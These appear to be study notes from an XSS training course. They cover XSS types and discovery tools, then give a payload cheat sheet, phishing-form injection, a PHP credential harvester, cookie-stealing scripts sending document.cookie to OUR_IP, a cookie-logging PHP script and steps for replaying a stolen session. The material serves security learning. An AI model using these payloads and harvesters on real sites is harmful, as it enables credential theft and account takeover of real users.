# Cross Site Scripting (XSS) Notes

Execution of JavaScript code in an input field. Inherently a client focused vulnerability and can be equated to a medium risk.

|Type| 	Description|
|:----|:----|
|Stored (Persistent) XSS 	|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|Reflected (Non-Persistent) XSS 	|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|DOM-based XSS 	|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|

## Cheat Sheet

|Code 	|Description|
|:----|:----|
|XSS| Payloads 	|
|<script>alert(window.origin)</script> 	|Basic XSS Payload|
|<plaintext> |	Basic XSS Payload|
|<script>print()</script> |	Basic XSS Payload|
|\<img src="" onerror=alert(window.origin)> 	|HTML-based XSS Payload|
|<script>document.body.style.background = "#141d2b"</script> 	|Change Background Color|
|<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> |	Change Background Image|
|<script>document.title = 'HackTheBox Academy'</script> 	|Change Website Title|
|<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script> 	|Overwrite website's main body|
|<script>document.getElementById('urlform').remove();</script> 	|Remove certain HTML element|
|<script src="http://OUR_IP/script.js"></script>| 	Load remote script|
|<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script> 	|Send Cookie details to us
Commands 	|
|python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 	|Run xsstrike on a url parameter|
|sudo nc -lvnp 80 	|Start netcat listener|
|sudo php -S 0.0.0.0:80 	|Start PHP server|


## Stored XSS

If the value gets stored in say the DB and is pulled up for any user it's stored.

Typical payload
```
<script>alert('1')</script>
```

## Reflected XSS

Only displayed for the current user, usually from input placed in. Perfect for phishing or csrf type of attacks.

Display cookie values

```
<script>alert(document.cookie)</script>
```

## DOM XSS

While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

For DOM XSS there are two definitions to understand. The `Source` is the JavaScript object that takes the user input, and it can be any input parameter. The `Sink` is the function that writes the user input to a DOM Object. If the Sink doesn't properly sanitize the input we could get XSS. Common DOM objects:
- document.write()
- DOM.innerHTML
- DOM.outerHTML

JQuery functions that write to the DOM:
- add()
- after()
- append()

Other payload

```
<img src="" onerror=alert(window.origin)>
```

## XSS Discovery 

### Automated

We can use automated tools like Nessus, Burp Pro, or ZAP

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). We can try XSS Strike by cloning it to our VM with git clone

```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

### Manual

Payload lists: 
- [Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [xss-payload-list](https://github.com/payloadbox/xss-payload-list)

Using fuzzers like ffuf we can take these lists and test parameters like this.


### Code Review

Reviewing code would be the quickest way to check, but requires access to the code for it to work. 

# Attacks

## Defacing

Just use the XSS to make the website ugly or say something it shouldn't. Could be used to make things like some sort of drive by attacks.

## Phishing

Good use case, send a crafted URL with the XSS payload in it to trick a user.

In this use case we will create our own login form to capture users credentials

### Example login form in html

```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

The login form should look as follows:

```
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

Now we should prepare our XSS code on the vulnerable form. To write HTML code to the vulnerable page we can use the JavaScript function `document.write()`. Also we should minify the code into one line/ 

Minified code:

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

If you have values you want to hide, like in our case a `Image URL` button to fool the user to login, do so like below

```
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

We can use the id valiue to get rid of this function:

```
document.getElementById('urlform').remove();
```

All together:

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

### Credential Stealing

Crafting an xss link to phish a user to steal credentials

Create a file on your machine to host a login form that will trick the user to enter

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Now host it

```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

This will save the creds as creds.txt

### Session Hijacking

If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

### Blind XSS Detection

If say the xss is popped from a panel/page we don't have access to we can send remote loading scripts to see the interaction and the execution of the blind xss.

```
<script src="http://OUR_IP/script.js"></script>
```

If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on

Other remote payloads from payloadallthethings

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

before sending we should start up our php server

```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP

example:

```
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```

### Session Hijacking

Once we find a working xxs we can send a specially crafted payload that will send their cookie info to our server running the php web server. 

These will be hosted on our php server, either one can work, saved as script.js:

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Then we send a payload to call it and run this javascript

```
<script src=http://OUR_IP/script.js></script>
```

To add additional functionality to separate the cookie values we can do so with this:

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

we can use this cookie on the login.php page to access the victim's account. To do so, once we navigate to /hijacking/login.php, we can click Shift+F9 in Firefox to reveal the Storage bar in the Developer Tools. Then, we can click on the + button on the top right corner and add our cookie, where the Name is the part before = and the Value is the part after = from our stolen cookie.
